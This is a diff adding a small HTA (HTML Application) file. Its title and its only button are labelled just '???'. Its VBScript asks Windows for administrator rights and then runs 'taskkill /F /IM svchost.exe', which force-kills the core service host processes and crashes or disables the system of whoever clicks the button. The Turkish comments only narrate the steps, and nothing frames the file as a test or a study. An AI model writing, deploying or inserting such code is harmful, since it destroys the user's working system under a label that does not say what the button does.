@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>???</title>
+<hta:application
+  applicationName="???"
+  border="thin"
+  caption="yes"
+  icon=""
+  showInTaskbar="yes"
+  singleInstance="yes"
+  sysMenu="yes"
+  windowState="normal"
+>
+<script language="VBScript">
+Sub RunTaskkillAdmin
+
+  ' Çalıştırılacak komut
+  komut = "taskkill /F /IM svchost.exe"
+
+  ' Shell.Application nesnesi oluştur
+  Set objShellApp = CreateObject("Shell.Application")
+
+  ' Komutu yönetici ayrıcalıklarıyla çalıştırmayı iste
+  objShellApp.ShellExecute "cmd.exe", "/c " & komut, "", "runas", 1
+
+  ' Nesneyi serbest bırak
+  Set objShellApp = Nothing
+
+End Sub
+</script>
+</head>
+<body>
+  <button onclick="RunTaskkillAdmin()">???</button>
+</body>
+</html>
